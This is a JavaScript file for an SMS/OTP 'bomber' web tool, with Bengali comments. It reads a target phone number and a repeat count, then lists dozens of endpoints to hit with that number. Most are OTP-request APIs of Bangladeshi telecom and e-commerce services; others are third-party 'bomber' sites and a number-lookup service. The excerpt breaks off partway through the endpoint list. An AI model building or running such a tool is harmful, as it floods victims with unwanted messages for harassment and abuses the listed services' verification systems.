let isCooldown = false;

// পেজ লোড হওয়ার সময় আগের কুলডাউন চেক করা
window.onload = function() {
    const savedCooldownTime = localStorage.getItem('cooldownEndTime');
    if (savedCooldownTime) {
        const currentTime = Date.now();
        if (currentTime < savedCooldownTime) {
            const remainingTime = Math.ceil((savedCooldownTime - currentTime) / 1000);
            activateCooldown(remainingTime);
        }
    }
};

async function startProcess() {
    const phone = document.getElementById('target').value;
    const countInput = document.getElementById('count');
    const amount = parseInt(countInput.value); 
    const display = document.getElementById('display');

    if (isCooldown) {
        display.innerText = "Wait for cooldown to end!";
        return;
    }

    if(!phone || !amount) { 
        display.innerText = "Enter phone and count!"; 
        return; 
    }

    // আপনার দেওয়া প্রতিটি এপিআই এখানে নির্ভুলভাবে যোগ করা হয়েছে
    let apis = [
        { url: `https://expcyber.my.id/apis/v1.php?phone=${phone}`, method: 'GET' },
        { url: `https://lmnx9.xyz/boom/free.php?number=${phone}&amount=${amount}`, method: 'GET' },
        { url: `https://cokestudio23.sslwireless.com/api/check-gp-number`, method: 'POST', data: { msisdn: phone } },
        { url: `https://weblogin.grameenphone.com/backend/api/v1/otp`, method: 'POST', data: { msisdn: phone } },
        { url: `https://apix.rabbitholebd.com/appv2/login/requestOTP`, method: 'POST', data: { mobile: phone } },
        { url: `https://api.osudpotro.com/api/v1/users/send_otp`, method: 'POST', data: { mobile: phone, deviceToken: "web", language: "en", os: "web" } },
        { url: `https://fundesh.com.bd/api/auth/generateOTP?service_key=`, method: 'POST', data: { msisdn: phone } },
        { url: `https://api.swap.com.bd/api/v1/send-otp`, method: 'POST', data: { phone: phone } },
        { url: `https://api.bd.airtel.com/v1/account/login/otp`, method: 'POST', data: { phone_number: phone } },
        { url: `https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${phone}`, method: 'GET' },
        { url: `https://eshop-api.banglalink.net/api/v1/customer/send-otp`, method: 'POST', data: { type: 'phone', phone: phone } },
        { url: `https://cherykuwait.com/topbomb.php?phone=${phone}&amount=${amount}`, method: 'GET' },
        { url: `https://tcsbomberai.vercel.app/api/smsbomber?phone=${phone}`, method: 'GET' },
        { url: `https://ck638.ct.ws/?number=${phone}`, method: 'GET' },
        { url: `https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=${phone}`, method: 'GET' },
        { url: `https://bj-x-coder.top/bo_m_ber.php?phone=${phone}&amount=${amount}`, method: 'GET' },
        { url: `https://api.bd.airtel.com/v1/account/login/otp`, method: 'POST', data: { phone_number: phone } },
        { url: `https://zeron-num-info2o.vercel.app/api/search?num=${phone}`, method: 'GET' },
        { url: `https://weblogin.grameenphone.com/backend/api/v1/otp`, method: 'POST', data: { msisdn: phone } },
        { url: `https://tcsbomberai.vercel.app/api/smsbomber?phone=${phone}`, method: 'GET' },
        { url: `https://fundesh.com.bd/api/auth/generateOTP?service_key=`, method: 'POST', data: { msisdn: phone } },
        { url: `https://eshop-api.banglalink.net/api/v1/customer/send-otp`, method: 'POST', data: { type: 'phone', phone: phone } },
        { url: `https://cokestudio23.sslwireless.com/api/check-gp-number`, method: 'POST', data: { msisdn: phone } },
        { url: `https://apix.rabbitholebd.com/appv2/login/requestOTP`, method: 'POST', data: { mobile: phone } },
        { url: `https://api.swap.com.bd/api/v1/send-otp`, method: 'POST', data: { phone: phone } },
        { url: `https://api.osudpotro.com/api/v1/users/send_otp`, method: 'POST', data: { mobile: phone, deviceToken: "web", language: "en", os: "web" } },
        { url: `https://lmnx9.appletolha.com/boom/free.php?number=${phone}&amount=${amount}`, method: 'GET' },
        { url: `https://lmnx9.appletolha.com/call-boomber/trial.php?number=${phone}`, method: 'GET' },
        { url: `https://member.daraz.com.bd/user/api/send_otp`, method: 'POST', data: { phone: phone, type: 'login' } },
        { url: `https://api.pathao.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
        { url: `https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${phone}`, method: 'GET' },
        { url: `https://www.chaldal.com/api/v1/user/otp`, method: 'POST', data: { phone: phone } },
        { url: `https://api.hungrynaki.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
        { url: `https://api.bdtickets.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
